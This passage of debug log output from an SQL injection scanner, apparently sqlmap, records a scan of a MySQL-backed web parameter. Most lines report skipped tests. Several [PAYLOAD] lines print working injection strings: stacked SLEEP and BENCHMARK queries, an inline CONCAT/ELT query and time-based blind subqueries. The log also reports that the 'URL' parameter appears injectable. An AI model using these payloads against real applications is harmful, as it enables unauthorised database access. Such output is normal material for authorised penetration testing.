+[21:19:52] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because the payload for error-based has already been identified
+[21:19:52] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because the payload for error-based has already been identified
+[21:19:52] [INFO] testing 'MySQL inline queries'
+[21:19:52] [PAYLOAD] (SELECT CONCAT(0x71627a7a71,(ELT(3748=3748,1)),0x717a6b6271))
+[21:19:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[21:19:52] [PAYLOAD] test';SELECT SLEEP(5)#
+[21:19:53] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[21:19:53] [PAYLOAD] test';SELECT SLEEP(5)-- Gjkx
+[21:19:53] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[21:19:53] [PAYLOAD] test';(SELECT * FROM (SELECT(SLEEP(5)))Aqdw)#
+[21:19:53] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[21:19:53] [PAYLOAD] test';(SELECT * FROM (SELECT(SLEEP(5)))YlNH)-- rjIH
+[21:19:53] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[21:19:53] [PAYLOAD] test';SELECT BENCHMARK(5000000,MD5(0x6b485862))#
+[21:19:54] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:54] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[21:19:54] [PAYLOAD] test';SELECT BENCHMARK(5000000,MD5(0x414f4d73))-- FzGj
+[21:19:54] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[21:19:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[21:19:54] [PAYLOAD] test' AND (SELECT 3211 FROM (SELECT(SLEEP(5)))iduw)-- tBUx
+[21:19:59] [PAYLOAD] test' AND (SELECT 3211 FROM (SELECT(SLEEP(0)))iduw)-- tBUx
+[21:19:59] [PAYLOAD] test' AND (SELECT 3211 FROM (SELECT(SLEEP(5)))iduw)-- tBUx
+[21:20:04] [INFO] GET parameter 'URL' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL AND time-based blind (ELT)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL OR time-based blind (ELT)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL AND time-based blind (ELT - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL OR time-based blind (ELT - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (bool)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (ELT)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (MAKE_SET)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (original value)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause (original value)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL AND error-based - WHERE or HAVING clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'IBM DB2 AND error-based - WHERE or HAVING clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'IBM DB2 OR error-based - WHERE or HAVING clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'IBM DB2 error-based - Parameter replace' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'IBM DB2 error-based - ORDER BY clause' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)' because the payload for error-based has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL inline queries' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Oracle inline queries' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'SQLite inline queries' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Firebird inline queries' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'ClickHouse inline queries' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries (comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because its declared DBMS is different than provided
+[21:20:04] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind (comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind (comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle AND time-based blind' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle OR time-based blind' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle AND time-based blind (comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle OR time-based blind (comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[21:20:04] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
